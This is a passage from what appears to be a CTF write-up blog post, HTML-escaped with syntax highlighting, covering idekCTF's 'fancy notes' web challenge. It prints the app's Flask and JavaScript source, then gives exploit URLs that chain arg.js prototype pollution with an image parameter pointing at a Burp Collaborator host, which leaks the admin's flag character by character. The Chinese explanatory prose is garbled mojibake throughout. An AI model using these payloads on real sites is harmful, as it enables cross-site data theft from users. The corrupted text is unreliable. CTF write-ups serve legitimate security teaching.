&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;register.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">try_register&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;register.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;registration failed!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/create&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;nah&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;create.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;title&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75715e"># Ê≤°ÊúâSSTI&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;pls no&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">create_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;create.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;note successfully uploaded!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;create.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;you already have a note with that title!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/fancy&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fancify&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75715e"># ‰∏çËÆ∫get or post&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">items&lt;/span>&lt;span style="color:#111">()])&lt;/span> &lt;span style="color:#75715e"># ÈïøÂ∫¶‰∏çË∂ÖËøá1&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">results&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">find_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># Êü•ÊâæuserÁöÑnote qÊòØtitleÊàñcontent&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">results&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;here is your ùíªùí∂ùìÉùí∏ùìé note!&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;no notes found!&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fancy.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">note&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">results&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fancy.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;bad format! Your style params should not be so long!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fancy.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/report&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">report&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;report.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Popen&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;node&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;bot.js&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">shell&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;report.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin visited your url!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Èô§‰∫Üapp.pyËøòÊúâ‰∏Ä‰∏™fancify.jsÊúâÁÇπ‰∏úË•ø&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">fancify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">note&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">color&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">args&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">style&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">random&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">)).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">image&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">image&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#d88200">&amp;#39;/static/images/success.png&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// ÊîØÊåÅ‰º†ÂÖ•imageÂèÇÊï∞
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">styleElement&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">note&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">children&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#75af00">styleElement&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">innerHTML&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">style&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// i have no idea why i did this in such a scuffed way but I&amp;#39;m too lazy to change it. no this is not vulnerable
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">note&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">className&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`animation&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">color&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">img&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">image&lt;/span>
&lt;span style="color:#75af00">note&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">img&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">Arg&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">search&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">noteElement&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;note&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">noteElement&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">fancify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">noteElement&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰∫§‰∫íËøáÁ®ãÊÄª‰ΩìÊòØËøôÊ†∑ÁöÑÔºöÂèØ‰ª•ËæìÂÖ•Âπ∂‰øùÂ≠ònoteÔºå‰πãÂêéÈÄâÊã©Êàë‰ª¨ÁöÑnoteÂ∞ÜÂÖ∂fancify‰πãÂêéÊ∏≤ÊüìÂá∫Êù•&lt;/p>
&lt;pre tabindex="0">&lt;code>http://fancy-notes.chal.idek.team/fancy?q=Note+1&amp;amp;style=2
&lt;/code>&lt;/pre>&lt;p>ÂÖ∂‰∏≠Èô§‰∫Üq‰ª•Â§ñÁöÑÂèÇÊï∞ÈïøÂ∫¶‰∏çË∂ÖËøá1ÔºåÂ¶ÇÊûúÊ≤°ÊúâÊåáÂÆöimageÂπ∂‰∏înoteÂ≠òÂú®Â∞±‰ºöÂá∫Áé∞success.pngÁöÑÂõæÁâáÔºåÊåáÂÆö‰∫ÜÁöÑËØùÂ∞±ÊòØÂØπÂ∫îÂõæÁâá&lt;/p>
&lt;p>Âè¶Â§ñËøòÊúâ‰∏Ä‰∏™ÁªèÂÖ∏reportÁöÑbotÔºåÂÆÉ‰ª•adminË∫´‰ªΩÁôªÂÖ•ÂêéÂÜôÂÖ•‰∏ÄÊù°Âê´ÊúâflagÁöÑnoteÔºå‰πãÂêéËÆøÈóÆÊàë‰ª¨ÁöÑurl&lt;/p>
&lt;p>Êàë‰∏ÄÂºÄÂßãÂú®pythonÁöÑSSTIÈÉ®ÂàÜÊµ™Ë¥π‰∫Ü‰∏ÄÈÉ®ÂàÜÊó∂Èó¥ÔºåÊÉ≥ÁùÄÊòéÊòéÊ≤°ÊúâËøáÊª§‰∏∫‰ªÄ‰πà‰∏çËÉΩÊâßË°åÂëΩ‰ª§ÔºåÂêéÊù•ÊâçÁü•ÈÅìËÄÉÁÇπÂ∞±‰∏çÂú®ËøôÈáå&lt;/p>
&lt;p>Ëøô‰∏™È¢òÂÖ∂ÂÆûË∑ü[uiuCTF2021]YANAÂæàÂÉèÔºå‰πüÊòØÁ∫Øclient-sideÂÆâÂÖ®ÈóÆÈ¢òÂíåchar-by-charÊÄùÊÉ≥ÁöÑËøêÁî®ÔºåËÄåÊõ¥Êñπ‰æøÁöÑÊòØËøôÈáåËøûÂõûÊòæÊñπÂºèÈÉΩÂçÅÂàÜÊòéÁ°ÆÔºöÂê´ÊúâÊåáÂÆöÂÜÖÂÆπÁöÑnoteÂ≠òÂú®ÂàôÊ∏≤Êüìsuccess.png ‰∏çÂ≠òÂú®Âàô‰∏çÊ∏≤ÊüìÔºåÂπ∂‰∏îËøô‰∏™ÂõæÁâáÊàë‰ª¨ÂèØ‰ª•ÊåáÂÆöÔºåÈÇ£Â∞ÜÂÖ∂ËÆæ‰∏∫Êàë‰ª¨Ëá™Â∑±ÊúçÂä°Âô®‰∏äÁöÑÂõæÁâáÔºåÂπ∂char-by-charÁöÑÁõ≤Ê≥®Êü•ËØ¢Â≠óÁ¨¶Â∞±ÂèØ‰ª•ÂæóÂà∞flagÁöÑÂÜÖÂÆπ‰∫ÜÔºåÂ∞±ÂÉèËøôÊ†∑&lt;/p>
&lt;pre tabindex="0">&lt;code>http://fancy-notes.chal.idek.team/fancy?q=idekctf{&amp;amp;image=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
&lt;/code>&lt;/pre>&lt;p>‰∏çËøáÂπ∂Ê≤°ÊúâËøô‰πàËΩªÊùæÔºåapp.py‰∏≠ÈôêÂà∂‰∫ÜÈô§qÂèÇÊï∞‰ª•Â§ñÁöÑÂèÇÊï∞Â≠óÁ¨¶‰∏çË∂ÖËøá1ÔºåÂ¶Ç‰ΩïÁªïËøáÂë¢Ôºü&lt;/p>
&lt;p>ËÇ•ËÇ†ÁöÑÈ∏°Ë¥ºÔºåÂú®fancy.html‰∏≠ÂºïÂÖ•‰∫Ü‰∏Ä‰∏™Â§ñÈÉ®ÁöÑjsËÑöÊú¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËÄåËøô‰∏™arg.jsÊòØÂ≠òÂú®jsÂéüÂûãÊ±°ÊüìÁöÑÊ¥ûÂπ∂‰∏îÊúâÁé∞ÊàêÁöÑPOC-&amp;gt;https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md&lt;/p>
&lt;p>Ëøô‰∏çÂ∞±Â•ΩËØ¥‰∫ÜÔºü&lt;/p>
&lt;pre tabindex="0">&lt;code>http://fancy-notes.chal.idek.team/fancy?q=idekctf{&amp;amp;__proto__[image]=x&amp;amp;__proto__[image]=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
&lt;/code>&lt;/pre>&lt;p>‰πãÂêéÂè™ÈúÄË¶ÅÂØπqÂèÇÊï∞ÁöÑÂêéÈù¢char-by-charÂú∞Áõ≤Ê≥®Âç≥ÂèØ&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://fireshellsecurity.team/idekctf-writeups/#fancy-notes">wp&lt;/a>&lt;/p>
&lt;h2 id="steghide-as-a-service">steghide-as-a-service&lt;/h2>
&lt;blockquote>
&lt;p>As has long been demonstrated by CTF, only the most 1337 are capable of running steghide. To help bridge this immense skill gap, I created a web based tool for easy embedding of hidden messages.&lt;/p>
&lt;p>&lt;a href="http://steghide-as-a-service.chal.idek.team/">http://steghide-as-a-service.chal.idek.team/&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip">https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>Ë∑üphpÁöÑ‰∏ç‰∏ÄÊ†∑Ôºà‰∏ÄËà¨Ë¶ÅÁªïwafÊãø‰∏Ä‰∏™webshellÔºâÔºåflaskÁöÑÊñá‰ª∂‰∏ä‰º†ËÄÉÁÇπ‰∏ÄËà¨Âú®ÂÖ∂‰ªñÂú∞ÊñπÔºåÊØîÂ¶Ç‰∏Ä‰∫õtricks&amp;amp;SSTI&amp;amp;Cookie‰º™ÈÄ†ËøôÁßçÁöÑÔºåËøô‰∏™È¢ò‰πü‰∏ç‰æãÂ§ñÔºåÊòØ‰∏Ä‰∏™LFI&lt;/p>
&lt;p>ÂÖàÂÆ°‰∏Ä‰∏ã‰ª£Á†Å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># app.py&lt;/span>
